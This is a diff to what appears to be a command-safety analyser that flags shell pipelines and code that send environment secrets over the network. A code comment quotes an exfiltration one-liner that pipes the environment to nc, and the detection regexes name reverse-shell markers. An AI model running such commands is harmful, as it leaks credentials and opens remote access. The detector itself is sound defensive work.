@@ -105,10 +105,14 @@ def pipeline(p: shell.Pipeline, ctx: Ctx) -> None:
         node(p.stages[0], ctx, None)
         return
     prev: Stage | None = None
+    secret = False
     for stage in p.stages:
         sub = ctx.child(marks=True)
         prev = node(stage, sub, prev) or Stage()
-        prev.secret = prev.secret or "secret" in sub.marks
+        # The whole environment holds every token the session has: it is as secret as one named. A
+        # secret stays secret down the pipe: `env | gzip | nc host 1` still sends it (#350).
+        secret = secret or prev.secret or prev.environ or "secret" in sub.marks
+        prev.secret = secret
         prev.downloads = prev.downloads or "download" in sub.marks
         ctx.marks |= sub.marks
 
@@ -1704,6 +1708,12 @@ CODE_SHELL_SOCKET = re.compile(r"(?s)socket.*(?:dup2|pty\.spawn|/bin/(?:ba|z)?sh
                                r"fsockopen.*(?:exec|proc_open|/bin/sh)")
 CODE_SECRET_ENV = re.compile(r"(?:os\.environ(?:\.get)?\s*[\[(]\s*['\"]|process\.env\.|getenv\s*\(\s*['\"]|"
                              r"ENV\[['\"])(\w+)")
+# The whole environment at once (str(os.environ), dict(os.environ), JSON.stringify(process.env), %ENV):
+# every token in it. Reading one variable, a copy handed to a child process or a default set are not (#350).
+CODE_WHOLE_ENV = re.compile(r"(?<![\w.])(?<!env=)(?<!env\s=\s)os\.environ\b"
+                            r"(?!\s*\[|\.(?:get|setdefault|pop|update|__setitem__)\b)"
+                            r"|(?<![\w$])(?<![\w$]\.)(?<!env:\s)(?<!env:)process\.env\b(?!\s*[.\[])"
+                            r"|\bENV\.(?:to_h|to_a|inspect|each|map)\b|%ENV\b")
 STRING_LITERAL = re.compile(r"'''(.*?)'''|\"\"\"(.*?)\"\"\"|'((?:\\.|[^'\\\n])*)'|\"((?:\\.|[^\"\\\n])*)\"",
                             re.S)
 SED_EXEC = re.compile(r"(?:^|[;\n{}])\s*(?:\d+|\$|/[^/]*/)?\s*e(?:\s|$|;)|/e\s*$"
@@ -1982,6 +1992,9 @@ def code_check(code: Arg, ctx: Ctx, via: str, lang: str = "") -> Stage:
     if network:
         if secret_hit:
             ctx.add("egress-secret", f"`{via}` reads a secret file and talks to the network.")
+        elif CODE_WHOLE_ENV.search(text):
+            ctx.add("egress-secret", f"`{via}` reads the whole environment, where tokens live, and talks to "
+                                     "the network.")
         elif any(secrets.has_secret(lit) for lit in literals):
             ctx.add("egress-secret", f"`{via}` sends what looks like a secret over the network.")
         elif secret_env:
